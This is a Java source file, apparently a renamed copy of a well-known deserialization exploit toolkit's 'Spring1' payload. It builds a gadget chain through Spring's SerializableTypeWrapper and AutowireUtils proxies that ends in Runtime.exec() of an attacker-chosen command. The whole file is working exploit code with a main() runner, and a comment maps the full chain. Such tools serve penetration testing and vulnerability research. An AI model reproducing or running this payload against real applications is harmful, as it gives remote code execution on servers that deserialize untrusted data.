package dogeser.payloads;

import static java.lang.Class.forName;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import javax.xml.transform.Templates;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.annotation.PayloadTest;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.JavaVersion;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;
import org.springframework.beans.factory.ObjectFactory;

/*
	Gadget chain:

		ObjectInputStream.readObject()
			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.findMethod()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.invokeMethod()
					Method.invoke()
						Templates(Proxy).newTransformer()
							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
								ObjectFactory(Proxy).getObject()
									AnnotationInvocationHandler.invoke()
										HashMap.get()
								Method.invoke()
									TemplatesImpl.newTransformer()
										TemplatesImpl.getTransletInstance()
											TemplatesImpl.defineTransletClasses()
												TemplatesImpl.TransletClassLoader.defineClass()
													Pwner*(Javassist-generated).<static init>
														Runtime.exec()

 */

@SuppressWarnings({"rawtypes"})
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
@dogeser.payloads.annotation.Authors({ Authors.FROHOFF })
public class Spring1 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);

		final ObjectFactory objectFactoryProxy =
				dogeser.payloads.util.Gadgets.createMemoitizedProxy(dogeser.payloads.util.Gadgets.createMap("getObject", templates), ObjectFactory.class);

		final Type typeTemplatesProxy = dogeser.payloads.util.Gadgets.createProxy((InvocationHandler)
				dogeser.payloads.util.Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
					.newInstance(objectFactoryProxy), Type.class, Templates.class);

		final Object typeProviderProxy = dogeser.payloads.util.Gadgets.createMemoitizedProxy(
				Gadgets.createMap("getType", typeTemplatesProxy),
				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

		final Constructor mitpCtor = dogeser.payloads.util.Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
		Reflections.setFieldValue(mitp, "methodName", "newTransformer");

		return mitp;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Spring1.class, args);
	}

	public static boolean isApplicableJavaVersion() {
	    return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
